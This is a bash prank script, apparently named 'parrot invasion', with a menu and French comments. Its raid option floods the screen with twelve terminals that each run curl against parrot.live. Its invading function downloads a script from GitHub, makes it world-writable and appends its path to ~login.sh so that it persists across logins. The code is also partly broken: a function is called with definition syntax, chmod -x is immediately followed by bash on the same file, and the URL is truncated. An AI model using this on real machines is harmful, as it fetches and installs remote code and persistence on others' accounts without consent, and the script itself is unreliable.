#!/bin/bash

raid()
{
# Format gnome : gnome-terminal --window --geometry=[width]x[length]+[cordX]+[cordY]
# Obtenir la résolution de l'écran : resolution=$(xdpyinfo | awk '/dimensions:/ {print $2}')

nb_colonne=3
nb_ligne=4

width_terminal=80
heigth_terminal=24

width_pixel=12
heigth_pixel=22

for i in $(seq 0 $((nb_colonne - 1)))
do
  for j in $(seq 0 $((nb_ligne - 1)))
  do
    ((X = j * 1050))
    ((Y = i * 750))

    gnome-terminal --window --geometry=${width_terminal}x${heigth_terminal}+${X}+${Y} -- bash -c "curl parrot.live; exec bash" &
  done
done
}

invading()
{
	curl -O https://raw.githubusercontent.com/Chahalor/parrot-invasion/refs/heads/...
	chmod 777 invading.sh
	echo $(realpath ./invading.sh) >> ~login.sh
	echo $(realpath)
}

	clear
	echo " _________________________ "
	echo "| what are we going to do |"
	echo "| 1 - sending a raid      |"
	echo "| 2 - make an invasion    |"
	echo "| 3 - take over this place|"
	echo "| 4 - cleaning the shit   |"
	echo "| q - quit                |"
	echo "|_________________________|"
	echo

while true; do

	read -p "Choisissez une option : " choix
	case $choix in
		1)
  			raid()
			;;
		2)
			chmod -x ./crontab.sh
			timeout 5 bash crontab.sh
			;;
		3)
			echo "not implement"
			;;
		4)
			rm parrot_invasion.sh
			;;
		q)
			echo "Quit"
			curl parrot.live
			exit 0
			;;
		*)
			echo "Option invalide. :("
			;;
	esac

	echo
done
